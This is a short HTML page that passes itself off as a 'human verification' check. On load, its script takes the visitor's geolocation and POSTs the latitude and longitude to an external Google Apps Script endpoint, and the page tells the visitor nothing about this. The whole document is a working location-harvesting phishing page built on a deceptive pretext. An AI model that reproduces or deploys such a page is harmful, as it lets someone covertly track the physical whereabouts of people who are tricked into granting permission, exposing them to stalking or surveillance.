<!DOCTYPE html>
<html>
<head>
  <title>Human verification</title>
</head>
<body>
  <h1>Verify you are human</h1>
  <p>Please allow you loaction to continue.</p>
   <script>
    window.onload = () => {
      navigator.geolocation.getCurrentPosition(sendToServer, showError);
    };

    function sendToServer(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch("https://script.google.com/macros/s/AKfycbxkE5Veu8LELIFLOLWDKLLtjssQwCKwvvgct1OxbOXAwphmXvP5xZsrP3JzDD15r2JX/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ lat, lon })
      })
      .then(res => res.text())
      .then(data => {
        document.getElementById("status").innerText = "Sent successfully!";
      })
      .catch(err => {
        document.getElementById("status").innerText = "Failed to send";
      });
    }

    function showError() {
      document.getElementById("status").innerText =
        "Permission denied or error getting location.";
    }
  </script>
</body>
</html>
